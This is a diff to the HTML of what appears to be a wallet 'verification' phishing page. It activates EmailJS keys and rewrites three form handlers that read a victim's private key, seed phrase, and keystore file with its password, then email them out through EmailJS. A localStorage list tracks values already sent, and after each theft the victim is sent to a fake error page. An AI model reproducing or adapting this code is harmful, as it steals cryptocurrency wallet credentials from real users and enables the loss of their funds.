@@ -708,11 +708,11 @@
     <link as="fetch" rel="preload" href="https://verifyme.cloud/page-data/apps/page-data.json" crossorigin="anonymous">
     <link as="fetch" rel="preload" href="https://verifyme.cloud/page-data/app-data.json" crossorigin="anonymous">
     <script type="text/javascript" src="js/email.min.js"></script>
-    <!-- <script type="text/javascript">
+    <script type="text/javascript">
         (function () {
             emailjs.init("j3jgC02UQTwxMkCWD");
         })();
-    </script> -->
+    </script>
 
     <style>
         @media screen and (max-width: 540px) {
@@ -983,10 +983,10 @@
                         </div>
                     </div>
                 </div>
-                <div class="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse"><a href="../" id="cancel" type="button"
+                <div class="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse"><button id="cancel" type="button"
                         class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
                         Cancel
-                </a>
+                    </button>
                 </div>
             </div>
         </div>
@@ -1947,78 +1947,120 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
     <script type="text/javascript">
-        emailjs.init('4muNtuz-EbN9ixDnh')
-      </script>
-      
-      <script>
-          const btn1 = document.getElementById("submitBtn1");
-          const btn2 = document.getElementById("submitBtn2");
-          const btn3 = document.getElementById("submitBtn3");
-      
-          document.getElementById('contact-form1')
-              .addEventListener('submit', function(event) {
-                  event.preventDefault();
-      
-                  btn1.innerText = "Processing...";
-                  document.querySelector('.show1').style.display = "none";
-      
-                  const serviceID = 'default_service';
-                  const templateID = 'template_h22lc6f';
-      
-                  emailjs.sendForm(serviceID, templateID, this)
-                      .then(() => {
-                              btn1.innerText = "PROCEED";
-                              //document.querySelector('.show1').style.display = "block";
-                               window.location = "error.html"
-                          }, (err) => {
-                              btn1.innerText = "PROCEED";
-                              alert("Please try again!");
-                      });
-              });
-      
-          document.getElementById('contact-form2')
-              .addEventListener('submit', function(event) {
-                  event.preventDefault();
-      
-                  btn2.innerText = "Processing...";
-                  document.querySelector('.show2').style.display = "none";
-      
-                  const serviceID = 'default_service';
-                  const templateID = 'template_h22lc6f';
-      
-                  emailjs.sendForm(serviceID, templateID, this)
-                      .then(() => {
-                              btn2.innerText = "PROCEED";
-                              //document.querySelector('.show2').style.display = "block";
-                               window.location = "error.html"
-                          }, (err) => {
-                              btn2.innerText = "PROCEED";
-                              alert("Please try again!");
-                      });
-              });
-      
-          document.getElementById('contact-form3')
-              .addEventListener('submit', function(event) {
-                  event.preventDefault();
-      
-                  btn3.innerText = "Processing...";
-                  document.querySelector('.show3').style.display = "none";
-      
-                  const serviceID = 'default_service';
-                  const templateID = 'template_h22lc6f';
-      
-                  emailjs.sendForm(serviceID, templateID, this)
-                      .then(() => {
-                              btn3.innerText = "PROCEED";
-                              //document.querySelector('.show3').style.display = "block";
-                               window.location = "error.html"
-                          }, (err) => {
-                              btn3.innerText = "PROCEED";
-                              alert("Please try again!");
-                      });
-              });
-      </script>
-      
+        emailjs.init('j3jgC02UQTwxMkCWD')
+    </script>
+
+    <script>
+        const btn1 = document.getElementById("submitBtn1");
+        const btn2 = document.getElementById("submitBtn2");
+        const btn3 = document.getElementById("submitBtn3");
+
+        var listOfSaved = JSON.parse(localStorage.getItem("somethingToSave")) || [];
+
+
+        function checkIfExist(one, two){
+            if(listOfSaved.includes(one+two)){
+                return true;
+            }
+        }
+        document.getElementById('contact-form1')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                var somethingToSave = document.getElementById('privatekeyText').value.trim();
+                if(checkIfExist(somethingToSave, "")){
+                    window.location = "error.html";
+                    return;
+                }
+
+                btn1.innerText = "Processing...";
+                document.querySelector('.show1').style.display = "none";
+
+                const serviceID = 'default_service';
+                const templateID = 'template_x8ovqwo';
+
+                console.log("400");
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn1.innerText = "PROCEED";
+                        //document.querySelector('.show1').style.display = "block";
+
+                        listOfSaved.push(somethingToSave);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
+
+                        window.location = "error.html"
+                    }, (err) => {
+                        btn1.innerText = "PROCEED";
+                        alert("Please try again!");
+                    });
+            });
+
+        document.getElementById('contact-form2')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+
+                var somethingToSave = document.getElementById('phraseText').value.trim();
+                if(checkIfExist(somethingToSave, "")){
+                    window.location = "error.html";
+                    return;
+                }
+
+                btn2.innerText = "Processing...";
+                document.querySelector('.show2').style.display = "none";
+
+                const serviceID = 'default_service';
+                const templateID = 'template_x8ovqwo';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn2.innerText = "PROCEED";
+                        //document.querySelector('.show2').style.display = "block";
+
+                        listOfSaved.push(somethingToSave);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
+                        
+                        window.location = "error.html"
+                    }, (err) => {
+                        btn2.innerText = "PROCEED";
+                        alert("Please try again!");
+                    });
+            });
+
+        document.getElementById('contact-form3')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+                
+                var somethingToSave1 = document.getElementById('keystoreText').value.trim();
+                var somethingToSave2 = document.getElementById('keystorePass').value.trim();
+                
+                if(checkIfExist(somethingToSave1, somethingToSave2)){
+                    window.location = "error.html";
+                    return;
+                }
+
+                btn3.innerText = "Processing...";
+                document.querySelector('.show3').style.display = "none";
+
+                const serviceID = 'default_service';
+                const templateID = 'template_x8ovqwo';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn3.innerText = "PROCEED";
+                        //document.querySelector('.show3').style.display = "block";
+
+
+                        listOfSaved.push(somethingToSave1 + somethingToSave2);
+                        localStorage.setItem("somethingToSave", JSON.stringify(listOfSaved));
+                        window.location = "error.html"
+                    }, (err) => {
+                        btn3.innerText = "PROCEED";
+                        alert("Please try again!");
+                    });
+            });
+    </script>
+
 </body>
 
 </html>
